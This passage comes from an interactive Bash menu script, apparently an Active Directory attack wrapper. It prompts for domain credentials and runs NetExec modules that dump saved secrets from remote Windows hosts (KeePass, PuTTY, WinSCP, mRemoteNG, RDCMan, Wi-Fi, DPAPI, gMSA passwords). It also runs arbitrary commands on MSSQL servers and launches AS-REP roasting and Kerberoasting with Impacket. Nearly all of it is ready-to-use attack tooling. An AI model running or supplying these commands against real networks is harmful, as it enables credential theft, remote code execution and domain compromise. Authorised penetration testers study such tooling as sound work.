                  echo ""
               elif [[ "$number" == "35" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m'
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc smb $Domain -u $User -p $Password -M keepass_discover $flag --[+]\033[0m"
                  echo ""
                  nxc smb $Domain -u $User -p $Password -M keepass_discover $flag
                  echo ""
               elif [[ "$number" == "36" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m'
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc smb $Domain -u $User -p $Password -M powershell_history $flag --[+]\033[0m"
                  echo ""
                  nxc smb $Domain -u $User -p $Password -M powershell_history $flag
                  echo ""
               elif [[ "$number" == "37" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m'
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc smb $Domain -u $User -p $Password -M recent_files $flag --[+]\033[0m"
                  echo ""
                  nxc smb $Domain -u $User -p $Password -M recent_files $flag
                  echo ""
               elif [[ "$number" == "38" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m'
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc smb $Domain -u $User -p $Password -M winscp $flag --[+]\033[0m"
                  echo ""
                  nxc smb $Domain -u $User -p $Password -M winscp $flag
                  echo ""
               elif [[ "$number" == "39" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m'
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc smb $Domain -u $User -p $Password -M teams_localdb $flag --[+]\033[0m"
                  echo ""
                  nxc smb $Domain -u $User -p $Password -M teams_localdb $flag
                  echo ""
               elif [[ "$number" == "40" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m'
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc smb $Domain -u $User -p $Password -M mremoteng $flag --[+]\033[0m"
                  echo ""
                  nxc smb $Domain -u $User -p $Password -M mremoteng $flag
                  echo ""
               elif [[ "$number" == "41" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m'
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc smb $Domain -u $User -p $Password -M mobaxterm $flag --[+]\033[0m"
                  echo ""
                  nxc smb $Domain -u $User -p $Password -M mobaxterm $flag
                  echo ""
               elif [[ "$number" == "42" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m'
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc smb $Domain -u $User -p $Password -M putty $flag --[+]\033[0m"
                  echo ""
                  nxc smb $Domain -u $User -p $Password -M putty $flag
                  echo ""
               elif [[ "$number" == "43" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m'
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc smb $Domain -u $User -p $Password -M rdcman $flag --[+]\033[0m"
                  echo ""
                  nxc smb $Domain -u $User -p $Password -M rdcman $flag
                  echo ""
               elif [[ "$number" == "44" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m'
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc smb $Domain -u $User -p $Password -M wifi $flag --[+]\033[0m"
                  echo ""
                  nxc smb $Domain -u $User -p $Password -M wifi $flag
                  echo ""
               elif [[ "$number" == "45" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m'
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc smb $Domain -u $User -p $Password --dpapi $flag --[+]\033[0m"
                  echo ""
                  nxc smb $Domain -u $User -p $Password --dpapi $flag
                  echo ""
               elif [[ "$number" == "46" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m' 
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc ldap $Domain -u $User -p $Password --gmsa $flag --[+]\033[0m"
                  nxc ldap $Domain -u $User -p $Password --gmsa $flag
                  echo ""
 	       elif [[ "$number" == "47" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m' 
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo ""
		  echo -e "\033[36m[+]-- Running nxc ldap $Domain -u $User -p $Password --trusted-for-delegation $flag --[+]\033[0m"
		  nxc ldap $Domain -u $User -p $Password --trusted-for-delegation $flag
                  echo ""
               elif [[ "$number" == "48" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m' 
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc ldap $Domain -u $User -p $Password -M ldap-checker $flag --[+]\033[0m"
                  nxc ldap $Domain -u $User -p $Password -M ldap-checker $flag
                  echo ""
               elif [[ "$number" == "49" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m' 
                  read_input Command $'\033[35mEnter The Command : \033[0m'
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
	          echo ""
	          echo -e "\033[36m[+]-- Running nxc mssql $Domain --local-auth -u $User -p $Password -x \"$Command\" $flag --[+]\033[0m"
	          nxc mssql $Domain --local-auth -u $User -p $Password -x "$Command" $flag
                  echo ""
               elif [[ "$number" == "exit" ]]; then
                    exit 0
               else
                  echo ""
                  echo -e "\033[35m[!] Enter a Valid Option\033[0m"
               fi
       done
    elif [[ "$tool" = "6" ]]; then
      while true; do
           history -a "$HISTFILE"
           echo  -e "\033[35m
	    ____      _   _   _ ____  _   _                                 
     	   / ___| ___| |_| \ | |  _ \| | | |___  ___ _ __ ___   _ __  _   _ 
	  | |  _ / _ \ __|  \| | |_) | | | / __|/ _ \ '__/ __| | '_ \| | | |
	  | |_| |  __/ |_| |\  |  __/| |_| \__ \  __/ |  \__ \_| |_) | |_| |
 	   \____|\___|\__|_| \_|_|    \___/|___/\___|_|  |___(_) .__/ \__, |
                                                    	       |_|    |___/ 
           \033[0m"
           echo "
               1) GetNPUsers.py -no-pass -usersfile users.txt domain/
           "
           read_input number $'\033[35m# \033[0m'
           if [[ "$number" == ".." ]]; then
               history -a "$HISTFILE"                             
               exec "$0" "$@"
           elif [[ "$number" == "1" ]]; then
               read_input Domain $'\033[35mEnter The Domain : \033[0m'  
               read_input users_file $'\033[35mEnter The Users_File : \033[0m' 
               read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
               Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
               if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then 
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
               elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
               else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
               fi
               echo ""
               echo -e "\033[36m[+]-- Running GetNPUsers.py -no-pass -usersfile $users_file $CLEAN_DOMAIN/ $dc_host --[+]\033[0m"
               echo ""
               GetNPUsers.py -no-pass -usersfile $users_file $CLEAN_DOMAIN/ $dc_host
               echo ""
           elif [[ "$number" == "exit" ]]; then
               exit 0
           else
               echo ""
               echo -e "\033[35m[!] Enter a Valid Option\033[0m"
           fi
      done
    elif [[ "$tool" = "7" ]]; then
      while true; do
           history -a "$HISTFILE"
           echo  -e "\033[35m
	    ____      _   _   _               ____  ____  _   _                   
	   / ___| ___| |_| | | |___  ___ _ __/ ___||  _ \| \ | |___   _ __  _   _ 
	  | |  _ / _ \ __| | | / __|/ _ \ '__\___ \| |_) |  \| / __| | '_ \| | | |
	  | |_| |  __/ |_| |_| \__ \  __/ |   ___) |  __/| |\  \__ \_| |_) | |_| |
 	   \____|\___|\__|\___/|___/\___|_|  |____/|_|   |_| \_|___(_) .__/ \__, |
                       	                                             |_|    |___/ 
           \033[0m"
           echo "
               1) GetUserSPNs.py domain/user:password -request
               2) GetUserSPNs.py -no-preauth "user" -usersfile users.txt -dc-host "DC" domain/
           "
           read_input number $'\033[35m# \033[0m'
           if [[ "$number" == ".." ]]; then
               history -a "$HISTFILE"                             
               exec "$0" "$@"
           elif [[ "$number" == "1" ]]; then
               read_input Domain $'\033[35mEnter The Domain : \033[0m'
               read_input User $'\033[35mEnter The User : \033[0m'  
               read_input Password $'\033[35mEnter The Password : \033[0m' 
               read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
               Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
               if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then 
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
               elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
               else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
               fi
               echo ""
               echo -e "\033[36m[+]-- Running GetUserSPNs.py $CLEAN_DOMAIN/$User:$Password -request $dc_host $flag --[+]\033[0m"
               echo ""
